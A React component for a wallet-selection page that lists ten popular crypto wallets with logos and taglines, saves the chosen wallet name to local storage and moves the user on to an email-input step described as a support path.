import { useState } from "react";
import { useNavigate } from "react-router-dom";

const wallets = [
  {
    name: "MetaMask",
    tagline: "The most popular Web3 wallet for DeFi and NFTs.",
    logo: "https://seeklogo.com/images/M/metamask-logo-1A980A2B26-seeklogo.com.png",
  },
  {
    name: "Trust Wallet",
    tagline: "Mobile-first wallet with broad multi-chain support.",
    logo: "https://seeklogo.com/images/T/trust-wallet-logo-D487217F7D-seeklogo.com.png",
  },
  {
    name: "Coinbase Wallet",
    tagline: "Secure wallet from the leading crypto exchange.",
    logo: "https://seeklogo.com/images/C/coinbase-logo-CA46291B62-seeklogo.com.png",
  },
  {
    name: "Rainbow",
    tagline: "Beautiful wallet built for Ethereum and NFTs.",
    logo: "https://seeklogo.com/images/R/rainbow-logo-5FFDC7BA18-seeklogo.com.png",
  },
  {
    name: "Phantom",
    tagline: "Top wallet for Solana and NFT collectors.",
    logo: "https://seeklogo.com/images/P/phantom-logo-0E1D5579AC-seeklogo.com.png",
  },
  {
    name: "Ledger Live",
    tagline: "Hardware wallet companion for maximum security.",
    logo: "https://seeklogo.com/images/L/ledger-logo-9A05484526-seeklogo.com.png",
  },
  {
    name: "Trezor Suite",
    tagline: "Trusted hardware wallet with advanced recovery tools.",
    logo: "https://seeklogo.com/images/T/trezor-logo-F72EC7EFF7-seeklogo.com.png",
  },
  {
    name: "Exodus",
    tagline: "User-friendly desktop and mobile wallet with multi-coin support.",
    logo: "https://seeklogo.com/images/E/exodus-logo-F9DA97B6CF-seeklogo.com.png",
  },
  {
    name: "Atomic Wallet",
    tagline: "Decentralized wallet with instant swaps built in.",
    logo: "https://seeklogo.com/images/A/atomic-wallet-logo-0FA0B9766F-seeklogo.com.png",
  },
  {
    name: "MyEtherWallet",
    tagline: "Ethereum-first wallet for advanced users and dApp access.",
    logo: "https://seeklogo.com/images/M/myetherwallet-logo-2C9551D96C-seeklogo.com.png",
  },
];

export const SupportedWallets = () => {
  const [selected, setSelected] = useState(null);
  const navigate = useNavigate();

  const handleContinue = () => {
    if (!selected) return;
    localStorage.setItem("selectedWallet", selected);
    navigate("/email-input");
  };

  return (
    <div className="min-h-screen bg-black text-white px-4 py-8">
      <div className="max-w-6xl mx-auto">
        <div className="text-center mb-10">
          <p className="text-sm uppercase tracking-[0.3em] text-orange-500 mb-3">
            Wallet Selection
          </p>
          <h1 className="text-4xl md:text-5xl font-bold mb-4">
            Choose your crypto wallet
          </h1>
          <p className="max-w-3xl mx-auto text-gray-400 text-base md:text-lg leading-relaxed">
            Select the wallet you use most often so we can connect you to the
            right support path. These are the top trending wallets trusted by
            crypto users worldwide.
          </p>
        </div>

        <div className="grid gap-5 sm:grid-cols-2 xl:grid-cols-3">
          {wallets.map((wallet, index) => (
            <button
              key={wallet.name}
              onClick={() => setSelected(wallet.name)}
              className={`group text-left p-5 border rounded-3xl transition duration-300 hover:border-orange-500 ${
                selected === wallet.name
                  ? "border-orange-500 bg-gray-900"
                  : "border-gray-800 bg-gray-950"
              }`}
            >
              <div className="flex items-center gap-4 mb-4">
                <img
                  src={wallet.logo}
                  alt={`${wallet.name} logo`}
                  className="w-12 h-12 rounded-2xl object-contain bg-white/5 p-2"
                />
                <div>
                  <h2 className="text-lg font-semibold">{wallet.name}</h2>
                  <p className="text-sm text-gray-400">
                    #{index + 1} trending wallet
                  </p>
                </div>
              </div>
              <p className="text-sm text-gray-300 leading-relaxed">
                {wallet.tagline}
              </p>
            </button>
          ))}
        </div>

        <div className="mt-10 flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
          <div>
            <p className="text-gray-400">
              {selected
                ? `Selected wallet: ${selected}`
                : "Pick one wallet to continue."}
            </p>
          </div>
          <button
            onClick={handleContinue}
            disabled={!selected}
            className="inline-flex items-center justify-center px-6 py-3 bg-orange-500 hover:bg-orange-600 disabled:bg-gray-700 text-white rounded-xl font-semibold transition duration-300 disabled:cursor-not-allowed"
          >
            Continue to Email
          </button>
        </div>
      </div>
    </div>
  );
};
